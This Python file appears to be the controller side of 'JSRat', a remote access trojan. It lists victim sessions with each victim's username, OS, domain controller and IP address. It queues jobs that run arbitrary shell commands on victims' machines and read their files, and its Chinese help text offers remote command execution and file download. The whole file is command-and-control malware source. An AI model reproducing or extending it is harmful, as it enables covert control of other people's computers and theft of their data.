#!/usr/bin/env python3
#coding:utf-8

import sys
import time
from colorama import Fore,Back,Style
from collections import OrderedDict

from lib.payload import Payload
class Session(object):
    SESSIONS = []
    def __init__(self):
        self.sessions = OrderedDict()
        self.session_info = OrderedDict() 

    def session_init(self, *args, **kwargs):
        self.SESSIONS.append(kwargs['sessionID'])
        #print(kwargs['sessionID'], kwargs['job_response'])
        payload = Payload.payload_info(jobID = 1)
        return payload
    
    def session_list(self):
        if not self.SESSIONS:
            print('[-] No Session')
            return
        print('-'*80)
        for index,val in enumerate(self.SESSIONS):
            info = self.session_info[val]
            # ID  username   OS   IP    Date
            output = '[{}] {}  {}   {}   {}'.format(
                index + 1,              #ID 
                info['userName'],       #username
                info['victimOS'],       #OS
                info['victimAddr'],     #IP
                info['date']           #时间
            )
            print(output)
        print('-'*80)

class Shell(Session):
    JOBS = OrderedDict()
    
    def __init__(self):
        super().__init__()
        self.curSession = None

    @property
    def prompt(self):
        raw_prompt = 'JSRat>'
        if self.curSession:
            return 'JSRat({})>'.format(Fore.GREEN + self.session_info[self.curSession]['victimAddr'] + Fore.RESET)
        return raw_prompt

    def job_init(self, sessionid):
        payload = Payload.payload_info(jobID = 1)
        return payload

    def job_load(self, sessionid):
        try:
            self.job_key, self.job_content = self.JOBS.popitem()
            return self.job_key, self.job_content
        except KeyError:
            return '', '' 
        
    def job_done(self, sessionID, job_key, response):
        if '///' in response:
            info = response.split('///') 
            self.session_info[sessionID] = {
                'userName': info[0],
                'computName': info[1],
                'victimOS': info[2],
                'domainCtrl': info[3],
                'arch': info[4],
                'currentDIR': info[5],
                'victimAddr': info[6], 
                'date': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
                }
        #命令执行完后，显示执行结果
        if self.curSession == sessionID:
            print(response)
            return
        print('\n{}'.format(response))
        return 

    def command_show(self, *args, **kwargs):
        sub_command = args[0]
        try:
            handler = getattr(self, 'show_{}'.format(sub_command))
            handler(args)
        except AttributeError:
            pass

    def show_info(self, *args):
        payload = Payload.payload_info(jobID = 1)
        self.JOBS['info'] = payload      

    def session_shell(self, *args, **kwargs):
        if not args:
            print('Unkown shell args')
            return None
        cmd = args[0].strip()
        if 'pwd' == cmd:
            cmd = r'echo %cd%'
        self.JOBS['shell'] = Payload.payload_shell(jobID = 1, cmd = cmd)

    def session_cat(self, *args, **kwargs):
        if not args:
            print('Special filename')
            return None
        self.JOBS['cat'] = Payload.payload_cat(jobID = 1, filename = args[0]) 

    def session_back(self, *args, **kwargs):
        if self.curSession:
            self.curSession = None
        return 
    def command_sessions(self, *args, **kwargs):
        '''
            {'sessionID': {
                'userName': userName,
                'computName': computerName,
                'victimOS': OS,
                'domainCtrl': DC,
                'arch': arch,
                'cwd': currentDIR,
                'victimAddr': victimAddr
            },}
        '''
        try:
            options = args[0].split(' ')
            if len(options) == 2:
                curID = int(options[1])-1
                if curID > len(self.SESSIONS) and self.SESSIONS:
                    print('[-] No {} Session'.format(curID)) 
                    return
                self.curSession = self.SESSIONS[curID] 
            elif len(options) == 1 and options[0] == '-i':
                self.session_list()
            else:
                self.session_list() 
                    
        except:
            pass

    def command_help(self, *args, **kwargs):
        if self.curSession:         #Session 下的帮助命令
            cmd_help = '''
help            打印session下的帮助命令
back            退出当前会话返回到主命令模式
shell <cmd>     执行远程主机系统命令，shell net user
        '''
        else:
            cmd_help = '''
help            打印主命令模式下的帮助
quit|exit       退出程序
sessions [-i [ID]]      查看当前会话列表或切换到对应ID的会话
download <remoteFile> <localFile>   从远程主机下载文件
        '''
        print(cmd_help)
    
            
    def command_download(self, *args, **kwargs):
        pass


    def command_clear(self, *args, **kwargs):
        import os
        os.system('clear')
    def command_exit(self, *args):
        sys.exit()
    
    def command_quit(self, *args):
        sys.exit()